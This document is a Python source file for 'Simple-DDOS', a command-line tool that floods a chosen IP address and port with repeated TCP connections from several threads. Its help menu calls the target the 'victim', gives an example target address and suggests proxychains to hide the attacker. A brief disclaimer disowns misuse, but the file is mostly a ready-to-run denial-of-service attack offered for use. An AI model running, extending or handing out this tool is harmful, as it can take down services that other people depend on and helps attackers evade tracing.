# imports
import socket
import threading
import sys
import os
from colorama import init, Fore


init()
nCounter = 1


def ddos(ip, port):
    global nCounter
    while True:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.settimeout(10)
        try:
            connection.connect((ip, port))
        except socket.timeout:
            print(Fore.MAGENTA + "[-]  No response from server! Maybe he doesn't exist?\n")
            socket.timeout(0)
            sys.exit(1)
        except socket.gaierror:
            print(Fore.MAGENTA + "[-]The ip or the port or both are incorrect!\n")
            sys.exit(1)
        except ConnectionRefusedError:
            print(Fore.MAGENTA + "[-]  The target denied the connection!\n")
            sys.exit(1)
        except:
            print(Fore.RED + "[!]  Server down!")
        connection.sendto("f0ace57f1580385b1994c4409a07e49ee909cce8a22a803e2ccf20bb354".encode("utf-8"), (ip, port))
        connection.close()
        if nCounter % 500:
            print(Fore.BLUE + "[+]  Server has been attacked " + str(nCounter) + " times!\n")
        nCounter += 1


if __name__ == '__main__':
    nIp = None
    nPort = None
    nThreads = None
    nLenparams = len(sys.argv)
    bHelpMenu = True

    if nLenparams > 1:
        bHelpMenu = False
        print(Fore.GREEN + "Loading...\n")
        nListIndex = nLenparams - 1
        nLenparamsPlus1 = nListIndex + 1
        nListNumber = 1
        try:
            while nListNumber != nLenparamsPlus1:
                param = sys.argv[nListNumber]
                if param == "-ip":
                    if not sys.argv[nListNumber + 1] == "" or " " or "-port":
                        nIp = sys.argv[nListNumber + 1]
                    else:
                        print(Fore.YELLOW + "[-]  The entry of the parameter 'ip' is not correct!\n")
                        sys.exit(1)
                if param == "-port":
                    if not sys.argv[nListNumber + 1] == "" or " " or "-threads":
                        nPort = sys.argv[nListNumber + 1]
                        try:
                            nPort = int(nPort)
                        except:
                            print(Fore.YELLOW + "[-]  The entry of the parameter 'thread' is not correct!\n")
                            sys.exit(1)
                    else:
                        print("[*]  default from port set to 80\n")
                        nPort = 80
                if param == "-threads":
                    if not sys.argv[nListNumber + 1] == "" or " ":
                        nThreads = sys.argv[nListNumber + 1]
                        try:
                            nThreads = int(nThreads)
                        except:
                            print(Fore.YELLOW + "[-]  The entry of the parameter 'thread' is not correct!\n")
                            sys.exit(1)
                    else:
                        print("default from threads set to 5\n")
                        nThreads = 5
                nListNumber += 2
        except IndexError:
            print(Fore.YELLOW + "[-]  On of the values ore more are incorrect. Please check your spelling.\n")
            sys.exit(1)

        if nIp is None:
            print(Fore.YELLOW + "[-]  The entry of the parameter 'ip' is not correct!\n")
        if nPort is None:
            print(Fore.GREEN + "[*]  set default from port to 80\n")
            nPort = 80
        if nThreads is None:
            print(Fore.GREEN + "[*]  set default from thread to 5\n")
            nThreads = 5

        print(Fore.BLUE + "[*]  DDOS-attack is running!\n")

        for i in range(nThreads):
            t = threading.Thread(target=ddos, args=(nIp, nPort))
            t.start()

    if bHelpMenu is True:
        print(Fore.CYAN + """
Simple-DDOS® - Copyright by Pascal Vallaster - version 5.9 - python-version = 3.9
""" + Fore.RED + """
Only use this script for good purpose! Do not use it for illegal activitis!
I assume no responsibility for any damage caused by an attack of this script!
It's on you to use this script right and at your own risk!
""" + Fore.CYAN + """
--Help Menu--
SimpleDDOS.py [-ip] [-port] [-threads]
       
-ip              ip-adress from victim
-port            port from victim
-threads         threads to run the ddos-attack


Defaults:
default from ip = None
default from port = 80
default from threads = 5

Example:
SimpleDDOS.py -ip 80.60.3.9 -port 21 -threads 50

Tipp for pros: Use proxychains or other similar programms!

Please report bugs to offsec16@gmail.com""")
